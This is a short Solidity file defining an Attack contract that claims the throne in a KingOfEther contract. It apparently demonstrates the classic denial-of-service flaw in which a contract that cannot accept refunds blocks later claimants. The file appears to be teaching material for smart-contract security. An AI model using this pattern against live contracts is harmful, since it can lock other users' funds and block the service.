// SPDX-License-Identifier: GPL-3.0

pragma solidity 0.8.7;
import "./KingOfEther.sol";

contract Attack {
    KingOfEther kingOfEther;

    constructor(KingOfEther _kingOfEther) {
        kingOfEther = KingOfEther(_kingOfEther);
    }

    function attack() public payable {
        kingOfEther.claimThrone{value: msg.value}();
    }
}
